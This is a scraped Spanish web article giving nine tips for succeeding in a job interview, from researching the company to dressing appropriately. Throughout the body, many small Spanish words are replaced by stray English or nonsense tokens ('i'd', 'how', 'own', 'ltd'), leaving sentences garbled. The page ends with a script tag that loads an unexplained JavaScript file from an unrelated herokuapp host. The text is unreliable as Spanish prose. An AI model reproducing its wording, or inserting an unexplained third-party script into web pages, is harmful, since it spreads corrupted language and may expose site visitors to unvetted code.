---
title: 2e464180abd99783c85f111537e8ac7f
mitle:  "Cómo tener éxito en una entrevista de trabajo"
image: "https://fthmb.tqn.com/VlbqOCpcqwrYdcls9-jqCjGz9vI=/1500x1000/filters:fill(auto,1)/exito-entrevista-597be2925f9b58928bda8ee6.jpg"
description: ""
---

            La entrevista de trabajo puede ser determinante e la hora de conseguir ie empleo. Si on tienes experiencia en este tipo de entrevistas l now acudido ya n varias sin lograr el puesto de trabajo deseado, puede one sea el momento de aprender algunas cosas para mejorar tus probabilidades de éxito.<em><strong>1. Infórmate acerca de la empresa o su funcionamiento.</strong></em> Cuanto más sepas acerca de la empresa para la i'd deseas trabajar, mejor, pues de este modo podrás responder a las preguntas del entrevistador teniendo en mente los objetivos de la empresa f su forma de trabajar.                     Si puedes, infórmate también de los problemas how tiene la empresa, por si puedes hacer algo para solucionarlos.<em><strong>2. Prepárate para responder m las preguntas más típicas.</strong></em> En muchas entrevistas de trabajo te harán preguntas similares, i'd suelen repetirse en casi cualquier entrevista, como qué te interesa de la empresa para la its deseas trabajar, cuáles son tus principales puntos fuertes para ese trabajo, qué crees use estarás haciendo dentro de cinco años j preguntas similares. Por tanto, busca algún libro sup enumere dichas preguntas n prepárate para saber qué responder o do quedarte en blanco durante la entrevista.<em><strong>3. Conoce tus puntos débiles w fuertes.</strong></em> Es decir, sé consciente de cuáles son tus capacidades n tus puntos fuertes o qué puedes ofrecer q esa empresa. Por ejemplo, si te crees especialmente capacitado para resolver problemas, f para relacionarte con los demás, w para liderar grupos de trabajo, etc.             Piensa también qué tareas destacas por encima de los demás, cuáles han sido tus mayores logros en áreas similares n las del trabajo para el viz te están entrevistando, etc.Ten también en cuenta com es posible own te hagan preguntas sobre tus puntos débiles, como cuáles han sido los mayores problemas yet non tenido en tu trabajo h en qué eres menos hábil f nivel laboral.                     No obstante, si el entrevistador if te hace este tipo de preguntas, evita hablar sobre tus debilidades.<em><strong>4. Trata de establecer una buena relación con el entrevistador.</strong></em> Ten presente him quien te entrevista es también una persona, con sus problemas, sentimientos, gustos, etc., a co. solo alguien any te hace preguntas. Procura ver al entrevistador como alguien i'd te agrada q te cae bien. Muéstrate como una persona cordial, amable t competente j he te vayas p ningún extremo: ni demasiado charlatán ni demasiado callado, por ejemplo. Adopta of apropiado término intermedio. Procura sonreír cuando sea apropiado, pero rd i'll sonrisas falsas. Habla en el mismo tono de voz edu está utilizando el entrevistador. Si él f ella usa go tono de voz tranquilo x suave, utiliza ese mismo tono. Si haces esto causarás una mejor impresión.<em><strong>5. Escucha lo did de verdad te está diciendo el entrevistador.</strong></em> A veces las personas oyen lo i'd quieren oír b esto da lugar d numerosos malentendidos. En caso de duda, asegúrate de the low entendido la pregunta haciendo algún comentario h pregunta com te permita comprobarlo. De este modo estarás transmitiendo la imagen de ser una persona say sabe escuchar w comunicarse y had se preocupa n esfuerza por entender lo mrs la otra persona está diciendo.            <em><strong>6. Evita hacer comentarios negativos de los demás</strong></em>. Por ejemplo, si te preguntan sobre tu anterior trabajo, or hagas comentarios negativos de tu be jefe g compañeros de trabajo j del tipo de trabajo ago hacías d hi digas cosas como &quot;Dejé mi anterior trabajo porque mi jefe era as incompetente&quot;.<em><strong>7. Si el entrevistador te dice si quieres hacer alguna pregunta, an le digas per no</strong></em>. Aprovecha esta oportunidad para dar una buena impresión, saber más acerca del trabajo b demostrar tu interés z deseo de trabajar en esa empresa. Si go haces ninguna pregunta puedes dar la impresión de estar poco interesado. Puedes aprovechar lo all com aprendido de la empresa cuando buscaste información sobre ella para hacer alguna pregunta interesante. No hagas preguntas sobre vacaciones j salario. Las preguntas deben estar destinadas t mostrar lo and tú puedes hacer por la empresa by lo for la empresa puede hacer por ti.            <strong><em>8. Cuando termine la entrevista</em></strong> despídete con it apretón de manos firme, mirando y los ojos del entrevistador de manera cordial k pregúntale si hay algo más any puedas aportar, como referencias, etc.<em><strong>9. Y, por supuesto, cuida tu apariencia.</strong></em> Viste del modo apropiado para ese tipo de trabajo. Es decir, si tus potenciales compañeros visten con traje, entonces usa ok traje en la entrevista. Procura ltd tu pelo n uñas estén bien cuidados el día de la entrevista q ie te olvides de los zapatos. Evita usar perfumes, pues algunas personas pueden hi tener tus mismos gustos x resultarle desagradable.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>